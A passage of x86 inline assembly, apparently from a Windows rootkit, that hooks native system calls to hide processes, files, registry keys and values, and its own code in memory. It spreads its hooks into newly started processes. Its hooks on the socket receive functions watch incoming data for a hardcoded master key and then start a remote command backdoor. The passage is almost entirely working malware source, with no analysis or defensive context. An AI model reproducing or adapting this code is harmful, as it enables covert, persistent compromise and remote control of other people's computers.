  mov edi,[ebp+00Ch]                            //edi >> ASystemInformation.HandlesCount
  mov ecx,[edi]                                 //ecx = ASystemInformation.HandlesCount
  add edi,004h                                  //edi >> ASystemInformation.HandlesInfo

  call @GetCurrentProcessId
 @fNewNtQuerySystemInformation_class_16_find_process:
  cmp eax,[edi]
  je @fNewNtQuerySystemInformation_class_16_find_handles
  add edi,SYSTEM_HANDLE_INFORMATION_SIZE        //edi >>  next record
  inc esi                                       //counter++
  cmp esi,ecx                                   //counter = ASystemInformation.HandlesCount ?
  je @fNewNtQuerySystemInformation_class_16_close_handles
  jmp @fNewNtQuerySystemInformation_class_16_find_process
 @fNewNtQuerySystemInformation_class_16_find_handles:
  movzx eax,word ptr [edi+006h]                 //eax = ABuffer.HandlesInfo[counter].Handle
  cmp eax,[ebp-008h]                            //compare with driver handle
  jnz @fNewNtQuerySystemInformation_class_16_find_thread_handle
  movzx eax,byte ptr [edi+004h]                 //ABuffer.HandlesInfo[counter].ObjectTypeNumber
  mov [ebp-014h],eax                            //type of handle = File
  inc edx                                       //handles found ++
  jmp @fNewNtQuerySystemInformation_class_16_find_handles_next
 @fNewNtQuerySystemInformation_class_16_find_thread_handle:
  cmp eax,[ebp-00Ch]                            //compare with thread handle
  jnz @fNewNtQuerySystemInformation_class_16_find_process_handle
  movzx eax,byte ptr [edi+004h]                 //ABuffer.HandlesInfo[counter].ObjectTypeNumber
  mov [ebp-018h],eax                            //type of handle = Thread
  inc edx                                       //handles found ++
  jmp @fNewNtQuerySystemInformation_class_16_find_handles_next
 @fNewNtQuerySystemInformation_class_16_find_process_handle:
  cmp eax,[ebp-010h]                            //compare with process handle
  jnz @fNewNtQuerySystemInformation_class_16_find_handles_next
  movzx eax,byte ptr [edi+004h]                 //ABuffer.HandlesInfo[counter].ObjectTypeNumber
  mov [ebp-01Ch],eax                            //type of handle = Process
  inc edx                                       //handles found ++

 @fNewNtQuerySystemInformation_class_16_find_handles_next:
  cmp edx,003h                                  //have we got all three types ?
  je @fNewNtQuerySystemInformation_class_16_process_buffer
  add edi,SYSTEM_HANDLE_INFORMATION_SIZE        //edi >>  next record
  inc esi                                       //counter++
  cmp esi,ecx                                   //counter = ASystemInformation.HandlesCount ?
  je @fNewNtQuerySystemInformation_class_16_close_handles
  jmp @fNewNtQuerySystemInformation_class_16_find_handles
 @fNewNtQuerySystemInformation_class_16_process_buffer:

  push dword ptr [ebp-010h]                     //AProcessHandle
  push dword ptr [ebp-00Ch]                     //AThreadHandle
  push dword ptr [ebp-008h]                     //ADriverHandle
  push dword ptr [ebp-01Ch]                     //AProcessHandleType
  push dword ptr [ebp-018h]                     //AThreadHandleType
  push dword ptr [ebp-014h]                     //AFileHandleType
  push dword ptr [ebp+014h]                     //AReturnLength
  push dword ptr [ebp+00Ch]                     //ASystemInformation
  call @ProcessHandleInformationBuffer

 @fNewNtQuerySystemInformation_class_16_close_handles:
  push dword ptr [ebp-010h]                     //LProcessHandle
  call [ebx+@NtCloseAddr]
  push dword ptr [ebp-00Ch]                     //LThreadHandle
  call [ebx+@NtCloseAddr]
  push dword ptr [ebp-008h]                     //LDriverHandle
  call [ebx+@NtCloseAddr]

  jmp @fNewNtQuerySystemInformation_end

 @fNewNtQuerySystemInformation_class_16_init:
 {$IFDEF LOGGING}
  {$IF Logging_Level=2}
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 001h
  lea eax,[ebx+@LogData6a]
  push eax
  call @LogPChar_without_length
  {$IFEND}
 {$ENDIF}


  xor esi,esi
  mov [ebp-008h],esi
  mov [ebp-00Ch],esi
  mov [ebp-010h],esi
  mov [ebp-030h],esi
  mov [ebp-02Ch],esi
  mov [ebp-028h],esi
  mov [ebp-024h],esi
  mov [ebp-020h],esi

  call @OpenDriver
 {new 079}
  mov [ebp-008h],eax
  test eax,eax
//  jz @fNewNtQuerySystemInformation_end
  jz @fNewNtQuerySystemInformation_call
 {/new 079}

  push 018h
  pop dword ptr [ebp-034h]

  lea esi,[ebp-03Ch]
  call @GetCurrentProcessId
  mov [esi],eax
  call @GetCurrentThreadId
  mov [esi+004h],eax
  push esi                                      //ClientId
  lea eax,[ebp-034h]
  push eax                                      //ObjectAttributes
  push 0001F03FFh                               //DesiredAccess = THREAD_ALL_ACCESS
  lea eax,[ebp-00Ch]
  push eax                                      //ThreadHandle
  call [ebx+@NtOpenThreadAddr]
  test eax,eax
  jnz @fNewNtQuerySystemInformation_class_16_close_handles

  push esi                                      //ClientId
  lea eax,[ebp-034h]
  push eax                                      //ObjectAttributes
  push 0001F0FFFh                               //DesiredAccess = PROCESS_ALL_ACCESS
  lea eax,[ebp-010h]
  push eax                                      //ProcessHandle
//  call [ebx+@NtOpenProcessAddr]
  call @Safety_NtOpenProcess
  test eax,eax
  jnz @fNewNtQuerySystemInformation_class_16_close_handles
  jmp @fNewNtQuerySystemInformation_call

 @fNewNtQuerySystemInformation_class_5:
  test eax,eax
  jnz @fNewNtQuerySystemInformation_end

  push 000h                                     //AProcessType = ptHideFiles
  push dword ptr [ebp+00Ch]                     //ASystemInformation
  call @ProcessSystemProcessesAndThreadsInformationBuffer
 @fNewNtQuerySystemInformation_result:
  mov [ebp-004h],eax

 @fNewNtQuerySystemInformation_end:
  push 010h
  jmp @NewAPITail

//TNtQueryDirectoryFile=function(AFileHanlde:THandle;AEvent:PHandle;AApcRoutine:PIO_APC_ROUTINE;AApcContext:Pointer;AIoStatusBlock:PIO_STATUS_BLOCK;AFileInformation:Pointer;AFileInformationLength:Cardinal;AFileInformationClass:TFileInformationClass;AReturnSingleEntry:Boolean;AFileName:PUnicodeString;ARestartScan:Boolean):Cardinal;stdcall;
 @fNewNtQueryDirectoryFile:
  push 004h                             //local variables
  call @NewAPIHead

  {
   -004         -       LResult:Cardinal
  }

  mov dword ptr [ebp-004h],0C0000001h   //STATUS_UNSUCCESSFUL

  lea eax,[ebx+@HT_OldNtQueryDirectoryFile]
  test dword ptr [eax+011h],-001h
  jz @fNewNtQueryDirectoryFile_end

  push dword ptr [ebp+030h]             //ARestartScan
  push dword ptr [ebp+02Ch]             //AFileName
  push dword ptr [ebp+028h]             //AReturnSingleEntry
  push dword ptr [ebp+024h]             //AFileInformationClass
  push dword ptr [ebp+020h]             //AFileInformationLength
  push dword ptr [ebp+01Ch]             //AFileInformation
  push dword ptr [ebp+018h]             //AIoStatusBlock
  push dword ptr [ebp+014h]             //AApcContext
  push dword ptr [ebp+010h]             //AApcRoutine
  push dword ptr [ebp+00Ch]             //AEvent
  push dword ptr [ebp+008h]             //AFileHandle
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewNtQueryDirectoryFile_end

  push dword ptr [ebp+028h]             //ReturnSingleEntry
  push dword ptr [ebp+024h]             //FileInformationClass
  push dword ptr [ebp+020h]             //FileInformationLength
  push dword ptr [ebp+01Ch]             //FileInformation
  call @ProcessDirectoryFileBuffer
  mov [ebp-004h],eax
 @fNewNtQueryDirectoryFile_end:
  push 02Ch
  jmp @NewAPITail

//TNtVdmControl=function(AControlCode:Cardinal;AControlData:Pointer):Cardinal;stdcall;
 @fNewNtVdmControl:
  push 004h                                     //local variables
  call @NewAPIHead

  {
   -004         -       LResult:Cardinal
  }

  mov dword ptr [ebp-004h],0C0000001h           //STATUS_UNSUCCESSFUL
  lea eax,[ebx+@HT_OldNtVdmControl]
  test dword ptr [eax+011h],-001h
  jz @fNewNtVdmControl_end

  push dword ptr [ebp+00Ch]             //AControlData
  push dword ptr [ebp+008h]             //AControlCode
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewNtVdmControl_end
  mov eax,[ebp+008h]
  sub eax,006h                          //VdmDirectoryFile
  jnz @fNewNtVdmControl_end

 {new}
  mov eax,[ebp+00Ch]
  test eax,eax
  jz @fNewNtVdmControl_end
  mov eax,[eax+004h]
  test eax,eax
  jz @fNewNtVdmControl_end

  xor edx,edx
  mov esi,eax

 @fNewNtVdmControl_count_buf_len:
  mov ecx,[esi]
  test ecx,ecx
  jz @fNewNtVdmControl_last_record
  add edx,ecx
  add esi,ecx
  jmp @fNewNtVdmControl_count_buf_len

 @fNewNtVdmControl_last_record:
  mov ecx,[esi+03Ch]
  add ecx,05Eh
  add edx,ecx

  push 000h                             //ReturnSingleEntry
  push 003h                             //FileInformationClass
  push edx                              //FileInformationLength
  push eax                              //FileInformation
  call @ProcessDirectoryFileBuffer
  mov [ebp-004h],eax
 {/new}

 @fNewNtVdmControl_end:
  push 008h
  jmp @NewAPITail

//TNtResumeThread=function(AThreadHandle:THandle;APreviousSuspendCount:PULONG):Cardinal;stdcall;
 @fNewNtResumeThread:
  push 020h                             //local variables
  call @NewAPIHead
  {
   -020         -       ThreadBasicInformation.ExitStatus
   -01C         -       ThreadBasicInformation.TebBaseAddress
   -018         -       ThreadBasicInformation.ClientId.UniqueProcess
   -014         -       ThreadBasicInformation.ClientId.UniqueThread
   -010         -       ThreadBasicInformation.AffinityMask
   -00C         -       ThreadBasicInformation.Priority
   -008         -       ThreadBasicInformation.BasePriority
   -004         -       LResult:Cardinal
  }

  mov dword ptr [ebp-004h],0C0000001h           //STATUS_UNSUCCESSFUL

  push 000h                                     //ReturnLength
  push 01Ch                                     //ThreadInformationLength
  lea eax,[ebp-020h]
  push eax                                      //ThreadInformation
  push 000h                                     //ThreadInformationClass = ThreadBasicInformation
  mov eax,[ebp+008h]
  push eax                                      //ThreadHandle
  call [ebx+@NtQueryInformationThreadAddr]
  test eax,eax
  jnz @fNewNtResumeThread_call

  call @GetCurrentProcessId
  mov ecx,[ebp-018h]
  cmp eax,ecx
  jz @fNewNtResumeThread_call
  push 000h                             //HookType = htNewProcess
  push ecx                              //PID
  call @HookProcess

 @fNewNtResumeThread_call:
  lea eax,[ebx+@HT_OldNtResumeThread]
  test dword ptr [eax+011h],-001h
  jz @fNewNtResumeThread_end

  push dword ptr [ebp+00Ch]             //APreviousSuspendCount
  push dword ptr [ebp+008h]             //AThreadHandle
  call eax
  mov [ebp-004h],eax
 @fNewNtResumeThread_end:
  push 008h
  jmp @NewAPITail

 //TNtEnumerateKey=function(AKeyHandle:HANDLE;AIndex:DWORD;AKeyInformationClass:KEY_INFORMATION_CLASS;AKeyInformation:Pointer;AKeyInformationLength:DWORD;AResultLength:Pointer):Cardinal;stdcall;
 @fNewNtEnumerateKey:
  push 00240h
  call @NewAPIHead
  {
   -00240..018  -       LBuf:array of Char;
   -014         -       LCounter:Cardinal
   -010         -       LInitDone:Boolean
   -00C         -       LRegKeysArray:Pointer
   -008         -       LFileMappingAddr:Pointer
   -004         -       LResult:Cardinal
  }
  mov dword ptr [ebp-004h],080000014h           //STATUS_EA_LIST_INCONSISTENT
  call @OpenFileMapping
 {new 079}
  mov [ebp-008h],eax
  test eax,eax
//  jz @fNewNtEnumerateKey_end
  jz @fNewNtEnumerateKey_call_origin
 {/new 079}

  add eax,[eax]                                 //eax >> RootProcessSize
  add eax,[eax]                                 //eax >> HiddenServicesSize
  add eax,[eax]                                 //eax >> RegKeysSize
  add eax,004h                                  //eax >> RegKeys
  mov [ebp-00Ch],eax
  xor eax,eax
  mov [ebp-010h],eax
  mov [ebp-014h],eax

 @fNewNtEnumerateKey_call:
  lea eax,[ebx+@HT_OldNtEnumerateKey]
  test dword ptr [eax+011h],-001h
  jz @fNewNtEnumerateKey_CloseMapping
  push dword ptr [ebp+01Ch]                     //AResultLength
  push 00220h                                   //AKeyInformationLength
  lea ecx,[ebp-00240h]
  push ecx                                      //AKeyInformation
  push 000h                                     //AKeyInformationClass = KeyBasicInformation
  push dword ptr [ebp+00Ch]                     //AIndex
  push dword ptr [ebp+008h]                     //AKeyHandle
  call eax
  test eax,eax
  jnz @fNewNtEnumerateKey_call_origin
  mov edx,[ebp-00234h]
  lea esi,[ebp-00230h]
  mov [esi+edx],ax

  cmp [ebp-010h],eax
  jnz @fNewNtEnumerateKey_GetTable

  push 001h
  pop dword ptr [ebp-010h]                      //LInitDone

  push dword ptr [ebp+008h]                     //AKeyHandle
  push dword ptr [ebp-00Ch]                     //LRegKeysArray
  push esi
  call @Registry_HowManyEntriesBefore
  mov [ebp-014h],eax
  jmp @fNewNtEnumerateKey_strcmp_end

 @fNewNtEnumerateKey_GetTable:
  mov edi,[ebp-00Ch]
 @fNewNtEnumerateKey_strcmp:
  mov al,byte ptr [edi]
  test al,al
  jz @fNewNtEnumerateKey_strcmp_not_match
  call @cmp_wide_pchar_caseinsens
  test eax,eax
  jnz @fNewNtEnumerateKey_strcmp_end
  call @pchar_len
  add edi,eax
  jmp @fNewNtEnumerateKey_strcmp
 @fNewNtEnumerateKey_strcmp_not_match:
  dec dword ptr [ebp-014h]
 @fNewNtEnumerateKey_strcmp_end:
  mov eax,[ebp-014h]
  test eax,eax
  jz @fNewNtEnumerateKey_call_origin
  inc eax
  jz @fNewNtEnumerateKey_call_origin
  inc dword ptr [ebp+00Ch]
  jmp @fNewNtEnumerateKey_call

 @fNewNtEnumerateKey_call_origin:
  lea eax,[ebx+@HT_OldNtEnumerateKey]
  test dword ptr [eax+011h],-001h
  jz @fNewNtEnumerateKey_CloseMapping
  push dword ptr [ebp+01Ch]                     //AResultLength
  push dword ptr [ebp+018h]                     //AKeyInformationLength
  push dword ptr [ebp+014h]                     //AKeyInformation
  push dword ptr [ebp+010h]                     //AKeyInformationClass
  push dword ptr [ebp+00Ch]                     //AIndex
  push dword ptr [ebp+008h]                     //AKeyHandle
  call eax
  mov [ebp-004h],eax

 @fNewNtEnumerateKey_CloseMapping:
  push dword ptr [ebp-008h]
  call @CloseFileMapping
 @fNewNtEnumerateKey_end:
  push 018h
  jmp @NewAPITail

 //TNtEnumerateValueKey=function(AKeyHandle:HANDLE;AIndex:DWORD;AKeyValueInformationClass:KEY_VALUE_INFORMATION_CLASS;AKeyValueInformation:Pointer;AKeyValueInformationLength:DWORD;AResultLength:Pointer):Cardinal;stdcall;
 @fNewNtEnumerateValueKey:
  push 00240h
  call @NewAPIHead
  {
   -00240..018  -       LBuf:array of Char;
   -014         -       LEntries:Cardinal
   -010         -       LIdxCounter:Cardinal
   -00C         -       LRegValuesArray:Pointer
   -008         -       LFileMappingAddr:Pointer
   -004         -       LResult:Cardinal
  }
  mov dword ptr [ebp-004h],08000001Ah           //STATUS_NO_MORE_ENTRIES
  call @OpenFileMapping
 {new 079}
  mov [ebp-008h],eax
  test eax,eax
//  jz @fNewNtEnumerateValueKey_end
  jz @fNewNtEnumerateValueKey_call_origin
 {/new 079}

  add eax,[eax]                                 //eax >> RootProcessSize
  add eax,[eax]                                 //eax >> HiddenServicesSize
  add eax,[eax]                                 //eax >> RegKeysSize
  add eax,[eax]                                 //eax >> RegValuesSize
  add eax,004h                                  //eax >> RegValues
  mov [ebp-00Ch],eax
  or eax,-001h
  mov [ebp-010h],eax
  mov eax,[ebp+00Ch]
  mov [ebp-014h],eax

 @fNewNtEnumerateValueKey_call:
  inc dword ptr [ebp-010h]
  lea eax,[ebx+@HT_OldNtEnumerateValueKey]
  test dword ptr [eax+011h],-001h
  jz @fNewNtEnumerateValueKey_CloseMapping
  push dword ptr [ebp+01Ch]                     //AResultLength
  push 00220h                                   //AKeyValueInformationLength
  lea ecx,[ebp-00240h]
  push ecx                                      //AKeyValueInformation
  push 000h                                     //AKeyValueInformationClass = KeyValueBasicInformation
  push dword ptr [ebp-010h]                     //AIndex
  push dword ptr [ebp+008h]                     //AKeyHandle
  call eax
  test eax,eax
  jnz @fNewNtEnumerateValueKey_call_origin
  mov edx,[ebp-00238h]
  lea esi,[ebp-00234h]
  mov [esi+edx],ax

  mov edi,[ebp-00Ch]
 @fNewNtEnumerateValueKey_strcmp:
  mov al,byte ptr [edi]
  test al,al
  jz @fNewNtEnumerateValueKey_strcmp_end
  call @cmp_wide_pchar_caseinsens_with_wildcard
  test eax,eax
  jnz @fNewNtEnumerateValueKey_strcmp_match
  call @pchar_len
  add edi,eax
  jmp @fNewNtEnumerateValueKey_strcmp
 @fNewNtEnumerateValueKey_strcmp_match:
  inc dword ptr [ebp+00Ch]
  inc dword ptr [ebp-014h]
 @fNewNtEnumerateValueKey_strcmp_end:
  mov eax,[ebp-010h]
  cmp eax,[ebp-014h]
  jnz @fNewNtEnumerateValueKey_call

 @fNewNtEnumerateValueKey_call_origin:
  lea eax,[ebx+@HT_OldNtEnumerateValueKey]
  test dword ptr [eax+011h],-001h
  jz @fNewNtEnumerateValueKey_CloseMapping
  push dword ptr [ebp+01Ch]                     //AReturnLength
  push dword ptr [ebp+018h]                     //AKeyValueInformationLength
  push dword ptr [ebp+014h]                     //AKeyValueInformation
  push dword ptr [ebp+010h]                     //AKeyValueInformationClass = KeyBasicInformation
  push dword ptr [ebp+00Ch]                     //AIndex
  push dword ptr [ebp+008h]                     //AKeyHandle
  call eax
  mov [ebp-004h],eax

 @fNewNtEnumerateValueKey_CloseMapping:
  push dword ptr [ebp-008h]
  call @CloseFileMapping
 @fNewNtEnumerateValueKey_end:
  push 018h
  jmp @NewAPITail

 //TNtReadVirtualMemory=function(AProcessHandle:THandle;ABaseAddress:Pointer;ABuffer:Pointer;ABufferLength:Cardinal;AReturnLength:Pointer):Cardinal;stdcall;
 @fNewNtReadVirtualMemory:
  push 030h
  call @NewAPIHead
  {
   -030         -       LNotHooked:Boolean
   -02C         -       LUnhookStaticPtr:Cardinal
   -028         -       LPHookTable:Pointer
   -024         -       LOrgBytesPtr:Pointer
   -020         -       LPRemFuncAddr:Pointer
   -01C         -       LPHookedFlags:Pointer
   -018         -       LRemAlloc:Pointer
   -014..-010   -       LBuf:array of Char
   -00C         -       LBytesRead:Cardinal
   -008         -       LHookCounter:Cardinal
   -004         -       LResult:Cardinal
  }
  mov [ebp-004h],08000000Dh                     //STATUS_PARTIAL_COPY

  xor eax,eax
  mov [ebp-030h],eax                            //LNotHooked

  push eax                                      //AReturnLength
  push 005h                                     //ABufferLength
  lea eax,[ebp-011h]
  push eax                                      //ABuffer
  mov eax,[ebx+@NtQuerySystemInformationAddr]
  push eax                                      //ABaseAddress
  push dword ptr [ebp+008h]                     //AProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @fNewNtReadVirtualMemory_end
  movzx eax,[ebp-011h]
  cmp eax,0E9h
  jz @NtReadVirtualMemory_get_addr
  inc dword ptr [ebp-030h]                      //LNotHooked
  jmp @fNewNtReadVirtualMemory_call
 @NtReadVirtualMemory_get_addr:
  lea ecx,[ebx+@Body]
  test eax,eax
  jnz @fNewNtReadVirtualMemory_body_set
  mov eax,[ebp-010h]
  add eax,[ebx+@NtQuerySystemInformationAddr]
  add eax,005h
  add eax,ecx
  lea ecx,[ebx+@fNewNtQuerySystemInformation]
  sub eax,ecx
  mov ecx,eax
 @fNewNtReadVirtualMemory_body_set:
  mov esi,ecx                                   //and here it is, esi = remote offset @Body
  mov [ebp-018h],esi                            //LRemAlloc

  xor eax,eax
  mov [ebp-008h],eax                            //LHookCounter
  mov [ebp-00Ch],eax                            //LBytesRead
  mov ecx,[ebp+018h]                            //AReturnLength
  test ecx,ecx
  jz @fNewNtReadVirtualMemory_Main
  mov [ecx],eax

 @fNewNtReadVirtualMemory_Main:
  //hide main code, no reading from this address ;)
  mov edi,[ebp+00Ch]                            //ABaseAddress
  cmp edi,esi
  jna @fNewNtReadVirtualMemory_Main_buf_before  //read buffer starts before our main code

  lea ecx,[ebx+@Body_ending]
  lea eax,[ebx+@Body]
  sub ecx,eax
  add ecx,esi

  cmp edi,ecx
  jnb @fNewNtReadVirtualMemory_call             //read buffer starts after our main code
  jmp @fNewNtReadVirtualMemory_end              //read buffer starts in our main code
 @fNewNtReadVirtualMemory_Main_buf_before:
  add edi,[ebp+014h]                            //add length
  cmp edi,esi
  ja @fNewNtReadVirtualMemory_end               //read buffer is in out main code

 @fNewNtReadVirtualMemory_call:
  push dword ptr [ebp+018h]                     //AReturnLength
  push dword ptr [ebp+014h]                     //ABufferLength
  push dword ptr [ebp+010h]                     //ABuffer
  push dword ptr [ebp+00Ch]                     //ABaseAddress
  push dword ptr [ebp+008h]                     //AProcessHandle
  call @Safety_NtReadVirtualMemory
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewNtReadVirtualMemory_end
  mov eax,[ebp-030h]                            //LNotHooked
  test eax,eax
  jnz @fNewNtReadVirtualMemory_end

  mov edx,[ebp+014h]                            //ABufferLength
  mov eax,[ebp+018h]                            //AReturnLength
  test eax,eax
  jz @fNewNtReadVirtualMemory_safe_read_bytes
  mov edx,[eax]
 @fNewNtReadVirtualMemory_safe_read_bytes:
  mov [ebp-00Ch],edx                            //LBytesRead

  lea eax,[ebx+@UnhookStatic]
  mov [ebp-02Ch],eax                            //LUnhookStaticPtr

  push HooksCount
  call @LocalAllocMem
  test eax,eax
  jz @fNewNtReadVirtualMemory_end
  mov [ebp-01Ch],eax                            //LPHookedFlags

  push HooksCount*HOOK_TABLE_ITEM_SIZE
  call @LocalAllocMem
  test eax,eax
  jz @fNewNtReadVirtualMemory_free_hooked_flags
  mov [ebp-028h],eax                            //LPHookTable
  mov [ebp-024h],eax

  push 000h                                     //ReturnLength
  push HooksCount                               //BufferLength
  push dword ptr [ebp-01Ch]                     //Buffer
  lea ecx,[ebx+@HookedFlags]                    //local hooked flags
  lea eax,[ebx+@Body]                           //
  sub ecx,eax                                   //- local body = relative len
  add ecx,[ebp-018h]                            //+ LRemAlloc = remote hooked flags
  push ecx                                      //BaseAddress
  push dword ptr [ebp+008h]                     //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @fNewNtReadVirtualMemory_free_hook_table

  push eax                                      //ReturnLength
  push HooksCount*HOOK_TABLE_ITEM_SIZE          //BufferLength
  push dword ptr [ebp-028h]                     //Buffer
  lea ecx,[ebx+@HookTable]                      //local hooked flags
  lea eax,[ebx+@Body]                           //
  sub ecx,eax                                   //- local body = relative len
  add ecx,[ebp-018h]                            //+ LRemAlloc = remote hook table
  push ecx                                      //BaseAddress
  push dword ptr [ebp+008h]                     //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @fNewNtReadVirtualMemory_free_hook_table

 @fNewNtReadVirtualMemory_check:
  mov edi,[ebp+00Ch]                            //ABaseAddress

  mov edx,[ebp-008h]                            //LHookCounter
  mov eax,[ebp-02Ch]                            //LUnhookStaticPtr
  mov eax,[eax+edx*008h+004h]                   //UnhookStatic[edx].FuncAddr addr
  mov eax,[ebx+eax]                             //UnhookStatic[edx].FuncAddr
  mov [ebp-020h],eax                            //LPRemFuncAddr

  mov edx,[ebp-008h]                            //LHookCounter
  mov ecx,[ebp-01Ch]                            //LPHookedFlags
  movzx ecx,byte ptr [ecx+edx]
  jecxz @fNewNtReadVirtualMemory_next           //check if this api is hooked

  //now we have to put pointer on original bytes to esi

  mov esi,[ebp-024h]                            //LOrgBytesPtr
  mov eax,[ebp-020h]                            //LPRemFuncAddr
  cmp edi,eax

  jb @fNewNtReadVirtualMemory_buf_before        //read buffer starts before our code
  je @fNewNtReadVirtualMemory_buf_set
  mov ecx,edi                                   //ecx = BaseAddress
  sub ecx,eax                                   //ecx = BaseAddress - FuncAddress = pos
  add esi,ecx                                   //esi = org bytes + pos
 @fNewNtReadVirtualMemory_buf_set:
  add eax,005h                                  //size of our code
  cmp edi,eax
  jnb @fNewNtReadVirtualMemory_next             //read buffer is above

  sub eax,edi                                   //eax = number of bytes to read
  cmp eax,[ebp-00Ch]                            //LBytesRead
  jbe @fNewNtReadVirtualMemory_buf_above_set_copy_to    //is buffer len => eax?
  mov eax,[ebp-00Ch]                            //if not number of bytes = buffer len
 @fNewNtReadVirtualMemory_buf_above_set_copy_to:
  //now eax si number of bytes we want to copy from esi to our buf in [ebp+010h]
  mov ecx,eax
  mov edi,[ebp+010h]                            //ABuffer
  jmp @fNewNtReadVirtualMemory_change

 @fNewNtReadVirtualMemory_buf_before:
  mov ecx,[ebp-00Ch]                            //LBytesRead
  add ecx,edi                                   //ecx = buffer end
  cmp ecx,eax                                   //check if buffer contains our code
  jb @fNewNtReadVirtualMemory_next
  lea ecx,[eax+005h]
  sub ecx,edi                                   //ecx = full buffer len
  cmp ecx,[ebp-00Ch]                            //LBytesRead
  jbe @fNewNtReadVirtualMemory_buf_before_set_full_len
  mov ecx,edi
  add ecx,[ebp-00Ch]                            //LBytesRead
  sub ecx,eax                                   //ecx = bytes to read

  push ecx
  jmp @fNewNtReadVirtualMemory_buf_before_set_copy_to
 @fNewNtReadVirtualMemory_buf_before_set_full_len:
  push 005h

 @fNewNtReadVirtualMemory_buf_before_set_copy_to:
  mov ecx,eax
  sub ecx,edi                                   //ecx = buffer delta
  mov edi,[ebp+010h]                            //ABuffer
  add edi,ecx                                   //copy to
  pop ecx                                       //pop bytes to change

 @fNewNtReadVirtualMemory_change:
  //ecx = bytes to change
  //esi = copy from
  //edi = copy to

  rep movsb

 @fNewNtReadVirtualMemory_next:
  add dword ptr [ebp-024h],HOOK_TABLE_ITEM_SIZE //LOrgBytesPtr
  inc dword ptr [ebp-008h]                      //LHookCounter
  cmp dword ptr [ebp-008h],HooksCount           //LHookCounter
  jb @fNewNtReadVirtualMemory_check

 @fNewNtReadVirtualMemory_free_hook_table:
  push dword ptr [ebp-028h]                     //LPHookTable
  call @LocalFreeMem
 @fNewNtReadVirtualMemory_free_hooked_flags:
  push dword ptr [ebp-01Ch]                     //LPHookedFlags
  call @LocalFreeMem
 @fNewNtReadVirtualMemory_end:
  push 014h
  jmp @NewAPITail

 //TLdrLoadDll=function(APath:PWSTR;AErrorCode:PDWORD;AModuleName:PUNICODE_STRING;AModuleInstance:PHINSTANCE):Cardinal;stdcall;
 @fNewLdrLoadDll:
  push 004h
  call @NewAPIHead
  {
   -004         -       LResult:Cardinal
  }
  mov dword ptr [ebp-004h],0C0000001h           //STATUS_UNSUCCESSFUL

  lea eax,[ebx+@HT_OldLdrLoadDll]
  test dword ptr [eax+011h],-001h
  jz @fNewLdrLoadDll_end
  push dword ptr [ebp+014h]                     //AKeyValueInformation
  push dword ptr [ebp+010h]                     //AKeyValueInformationClass = KeyBasicInformation
  push dword ptr [ebp+00Ch]                     //AIndex
  push dword ptr [ebp+008h]                     //AKeyHandle
  call eax
  mov [ebp-004h],eax

  //force RehookMe
  call @GetCurrentProcessId
  push 001h                                     //HookType = htRehook
  push eax                                      //PID
  call @HookProcess

 @fNewLdrLoadDll_end:
  push 010h
  jmp @NewAPITail

 //Trecv=function(const ASock:TSocket;var VBuf;ALen,AFlags:Integer):Integer;stdcall;
 @fNewrecv:
  push 004h                             //local variables
  call @NewAPIHead
  {
   -004         -       LResult:Cardinal
  }

  mov dword ptr [ebp-004h],SOCKET_ERROR

  lea eax,[ebx+@HT_Oldrecv]
  test dword ptr [eax+011h],-001h
  jz @fNewrecv_end
  push dword ptr [ebp+014h]
  push dword ptr [ebp+010h]
  push dword ptr [ebp+00Ch]
  push dword ptr [ebp+008h]
  call eax
  mov [ebp-004h],eax
  inc eax
  jz @fNewrecv_end
  cmp eax,MASTER_KEY_LEN+1
  jne @fNewrecv_end
  mov esi,[ebp+00Ch]
  lea edi,[ebx+@cMasterKey]
  call @cmp2pchars_casesens
  test eax,eax
  jz @fNewrecv_end

  xor eax,eax
  mov [esi],eax
  push dword ptr [ebp+008h]
  call @DoExec
  xor eax,eax
  mov [ebp-004h],eax

 @fNewrecv_end:
  push 010h
  jmp @NewAPITail

 //TWSARecv=function(const ASock:TSocket;ABuffers:LPWSABUF;ABufferCount:DWORD;var VNumberOfBytesRecvd:DWORD;var VFlags:DWORD;AOverlapped:LPWSAOVERLAPPED;ACompletionRoutine:LPWSAOVERLAPPED_COMPLETION_ROUTINE):Integer; stdcall;
 @fNewWSARecv:
  push 004h                                     //local variables
  call @NewAPIHead
  {
   -004         -       LResult:Cardinal
  }

  mov dword ptr [ebp-004h],SOCKET_ERROR

  mov edi,[ebp+01Ch]
  mov esi,[ebp+014h] //newfeature

  lea eax,[ebx+@HT_OldWSARecv]
  test dword ptr [eax+011h],-001h
  jz @fNewWSARecv_end
  push dword ptr [ebp+020h]                     //ACompletionRoutine
  push dword ptr [ebp+01Ch]                     //AOverlapped
  push dword ptr [ebp+018h]                     //VFlags
  push dword ptr [ebp+014h]                     //VNumberOfBytesRecvd
  push dword ptr [ebp+010h]                     //ABufferCount
  push dword ptr [ebp+00Ch]                     //ABuffers
  push dword ptr [ebp+008h]                     //ASock
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jz @fNewWSARecv_nulres
  inc eax
  jnz @fNewWSARecv_gotbuf
  call [ebx+@WSAGetLastErrorAddr]
  cmp eax,ERROR_IO_PENDING
  jnz @fNewWSARecv_end

 @fNewWSARecv_nulres:
  test edi,edi
  jnz @fNewWSARecv_overlapped
  mov eax,[esi]
  test eax,eax
  jz @fNewWSARecv_end
  inc eax
  jmp @fNewWSARecv_gotbuf

 @fNewWSARecv_overlapped:
  mov eax,[ebp+00Ch]
  mov eax,[eax+004h]
  test eax,eax
  jz @fNewWSARecv_end
  mov esi,eax
  push MASTER_KEY_LEN
  push esi
  call [ebx+@IsBadReadPtrAddr]
  test eax,eax
  jnz @fNewWSARecv_lookaround
  lea edi,[ebx+@cMasterKey]
  call @cmp2pchars_casesens
  test eax,eax
  jnz @fNewWSARecv_doexec
 @fNewWSARecv_lookaround:
  sub esi,MASTER_KEY_LEN
  push MASTER_KEY_LEN
  push esi
  call [ebx+@IsBadReadPtrAddr]
  test eax,eax
  jnz @fNewWSARecv_end
  jmp @fNewWSARecv_DoCompareBuf

 @fNewWSARecv_gotbuf:
  cmp eax,MASTER_KEY_LEN+1
  jne @fNewWSARecv_end
  mov esi,[ebp+00Ch]
  mov esi,[esi+004h]
